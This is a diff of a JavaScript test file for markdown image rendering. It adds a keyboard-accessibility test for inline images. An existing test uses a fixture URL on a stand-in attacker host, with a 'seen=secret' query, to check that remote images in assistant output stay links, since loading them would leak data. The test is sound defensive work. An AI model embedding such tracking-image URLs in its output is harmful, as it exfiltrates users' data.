@@ -308,7 +308,14 @@ describe('Markdown images', () => {
     expect(html).not.toContain('data-openchamber-markdown-image-label');
   });
 
-  test('keeps a remote assistant image a link, because a load reports what is read', () => {
+  test('makes an inline image reachable by keyboard, because a click opens a preview', () => {
+    const html = renderMarkdownSync('![after login](screens/a.png)', 'assistant-local');
+
+    expect(html).toContain('role="button"');
+    expect(html).toContain('tabindex="0"');
+  });
+
+test('keeps a remote assistant image a link, because a load reports what is read', () => {
     const html = renderMarkdownSync('![tracker](https://evil.example/pixel.png?seen=secret)', 'assistant-local');
 
     expect(html).not.toContain('<img');
